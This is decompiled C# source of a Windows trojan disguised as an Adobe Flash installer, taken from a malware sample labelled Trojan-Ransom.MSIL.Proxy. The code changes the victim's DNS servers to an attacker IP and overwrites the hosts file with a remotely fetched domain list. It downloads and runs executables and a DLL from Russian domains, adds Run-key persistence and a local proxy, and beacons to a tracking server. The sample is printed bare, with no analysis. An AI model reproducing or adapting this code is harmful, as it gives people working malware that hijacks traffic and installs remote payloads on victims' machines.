// Decompiled with JetBrains decompiler
// Type: AdobeInstall.Module1
// Assembly: AdobeInstall, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 86366FCF-8AFC-4D9D-B107-9DBD0EBA240D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.MSIL.Proxy.l-c60a1a4d7d0b496e1584c3966c8b2ac8b49db6a39abfa50cb0243967b4ef2d39.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;

namespace AdobeInstall
{
  [StandardModule]
  internal sealed class Module1
  {
    public static string mydns = "46.173.209.194";

    public static object IsGoodDNS(object dns) => (object) (Operators.CompareString(Module1.mydns, dns.ToString(), false) == 0);

    public static void makeDNS()
    {
      object objectValue1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.GetObject("winmgmts:\\\\" + "." + "\\root\\cimv2")), (Type) null, "ExecQuery", new object[1]
      {
        (object) "Select * from Win32_NetworkAdapterConfiguration where IPEnabled = True"
      }, (string[]) null, (Type[]) null, (bool[]) null));
      try
      {
        foreach (object obj1 in (IEnumerable) objectValue1)
        {
          object objectValue2 = RuntimeHelpers.GetObjectValue(obj1);
          object Instance1;
          try
          {
            Instance1 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type) null, "DNSServerSearchOrder", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Instance1 = (object) new object[2]
            {
              (object) Module1.mydns,
              (object) "8.8.8.8"
            };
            ProjectData.ClearProjectError();
          }
          try
          {
            RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(Instance1, new object[1]
            {
              (object) 0
            }, (string[]) null));
            RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(Instance1, new object[1]
            {
              (object) 1
            }, (string[]) null));
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Instance1 = (object) new object[2]
            {
              (object) Module1.mydns,
              (object) "8.8.8.8"
            };
            ProjectData.ClearProjectError();
          }
          if (Conversions.ToBoolean(Operators.NotObject(Module1.IsGoodDNS(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(Instance1, new object[1]
          {
            (object) 0
          }, (string[]) null))))))
          {
            object obj2 = (object) new object[2]
            {
              (object) Module1.mydns,
              RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet(Instance1, new object[1]
              {
                (object) 0
              }, (string[]) null))
            };
            object Instance2 = objectValue2;
            object[] objArray = new object[1]
            {
              RuntimeHelpers.GetObjectValue(obj2)
            };
            object[] Arguments = objArray;
            bool[] flagArray = new bool[1]{ true };
            bool[] CopyBack = flagArray;
            NewLateBinding.LateCall(Instance2, (Type) null, "SetDNSServerSearchOrder", Arguments, (string[]) null, (Type[]) null, CopyBack, true);
            if (flagArray[0])
              RuntimeHelpers.GetObjectValue(objArray[0]);
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public static void SaveToDisk(string resourceName, string fileName)
    {
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
      int index = 0;
      while (index < manifestResourceNames.Length)
      {
        string name = manifestResourceNames[index];
        if (Operators.CompareString(name.ToLower(), resourceName.ToLower(), false) == 0)
        {
          using (Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name))
          {
            if (manifestResourceStream == null)
              break;
            using (BinaryReader binaryReader = new BinaryReader(manifestResourceStream))
            {
              byte[] buffer = binaryReader.ReadBytes(checked ((int) manifestResourceStream.Length));
              using (FileStream output = new FileStream(fileName, FileMode.Create))
              {
                using (BinaryWriter binaryWriter = new BinaryWriter((Stream) output))
                {
                  binaryWriter.Write(buffer);
                  break;
                }
              }
            }
          }
        }
        else
          checked { ++index; }
      }
    }

    public static void SaveFiles()
    {
      try
      {
        string[] manifestResourceNames = Assembly.GetExecutingAssembly().GetManifestResourceNames();
        int index = 0;
        while (index < manifestResourceNames.Length)
        {
          string resourceName = manifestResourceNames[index];
          string str = resourceName.Replace("AdobeInstall.", "");
          string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia";
          if (!Directory.Exists(path))
            Directory.CreateDirectory(path);
          Module1.SaveToDisk(resourceName, path + "\\" + str);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void MakeHosts()
    {
      try
      {
        System.IO.File.WriteAllText(Environment.SystemDirectory + "\\drivers\\etc\\hosts", HttpHelper.DownloadText("http://laspetto.ru/domains.txt").Replace("$ip", Module1.mydns));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void UpdateDLL()
    {
      if (!HttpHelper.DownloadFile("http://vk-vmeste.ru/ProxyService.dll", Module1.proxyServerDLL_temp()))
        return;
      try
      {
        System.IO.File.Copy(Module1.proxyServerDLL_temp(), Module1.proxyServerDLL(), true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string selfFile() => Assembly.GetExecutingAssembly().Location;

    public static string TargetDir() => Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\";

    public static string targetSmsFile() => Module1.TargetDir() + "install_flashplayer.exe";

    public static string targetFile() => Module1.TargetDir() + "flashutill.exe";

    public static string proxyServerFile() => Module1.TargetDir() + "TestApp.exe";

    public static string proxyServerDLL() => Module1.TargetDir() + "ProxyService.dll";

    public static string proxyServerDLL_sample() => Module1.TargetDir() + "sample.txt";

    public static string proxyServerDLL_temp() => Module1.TargetDir() + "ProxyService.dll.temp";

    public static bool CheckIfIamInstalled()
    {
      try
      {
        return System.IO.File.Exists(Module1.proxyServerDLL());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    public static void MakeRegistry()
    {
      try
      {
        System.IO.File.Copy(Module1.selfFile(), Module1.targetFile(), true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue("me", (object) Module1.targetFile());
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue("me1", (object) Module1.proxyServerFile());
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        System.IO.File.WriteAllText(Module1.TargetDir() + "version", "1");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void WaitForInternet()
    {
      string contents;
      while (true)
      {
        contents = HttpHelper.DownloadText("http://vk-vmeste.ru/sample.txt");
        if (!contents.ToLower().Contains("replacement"))
          Thread.Sleep(5000);
        else
          break;
      }
      if (false)
        return;
      System.IO.File.WriteAllText(Module1.proxyServerDLL_sample(), contents);
    }

    public static bool IsDebugMode()
    {
      bool flag;
      try
      {
        flag = System.IO.File.Exists("D:\\debugmode.txt");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static void InstallYandex()
    {
      if (Module1.IsDebugMode())
        return;
      try
      {
        Process.Start(Module1.TargetDir() + "YandexInstalker.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [STAThread]
    public static void Main()
    {
      bool flag = Module1.CheckIfIamInstalled();
      Module1.makeDNS();
      Module1.SaveFiles();
      Module1.MakeRegistry();
      SettingsHelper.SetProxy("127.0.0.1", 8083);
      Module1.RunServer();
      if (!flag)
      {
        Thread.Sleep(100);
        Module1.RunSMS();
        Thread.Sleep(5000);
      }
      if (!flag)
        Module1.InstallYandex();
      Module1.WaitForInternet();
      Module1.MakeHosts();
      Module1.DropServer();
      Module1.UpdateDLL();
      Module1.RunServer();
      Module1.GoContact();
      Module1.Die();
    }

    public static void GoContact()
    {
      WebClient webClient = new WebClient();
      string Left = "";
      try
      {
        Left = Conversions.ToString(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue("Macromedia"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Operators.CompareString(Left, "", false) != 0)
        return;
      try
      {
        webClient.DownloadString("http://tds.heylook.ru/prod.ashx?field=prod3");
        webClient.Proxy = (IWebProxy) null;
        Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Macromedia", (object) "1");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Die()
    {
      Process[] processesByName = Process.GetProcessesByName(Path.GetFileName(Assembly.GetExecutingAssembly().Location));
      try
      {
        processesByName[0].Kill();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName[1].Kill();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void DropServer()
    {
      Process[] processesByName = Process.GetProcessesByName("TestApp");
      try
      {
        processesByName[0].Kill();
        processesByName[0].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName[1].Kill();
        processesByName[1].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void DropX()
    {
      Process[] processesByName1 = Process.GetProcessesByName("YandexInstakler");
      try
      {
        processesByName1[0].Kill();
        processesByName1[0].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName1[1].Kill();
        processesByName1[1].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Process[] processesByName2 = Process.GetProcessesByName("vktemy_1027a35407bcb8069c0a836716be1f");
      try
      {
        processesByName2[0].Kill();
        processesByName2[0].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        processesByName2[1].Kill();
        processesByName2[1].WaitForExit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void RunServer()
    {
      Module1.DropServer();
      try
      {
        Process.Start(Module1.proxyServerFile());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void RunSMS()
    {
      HttpHelper.DownloadFile("http://vk-vmeste.ru/install_flashplayer.exe", Module1.targetSmsFile());
      try
      {
        Process.Start(Module1.targetSmsFile());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
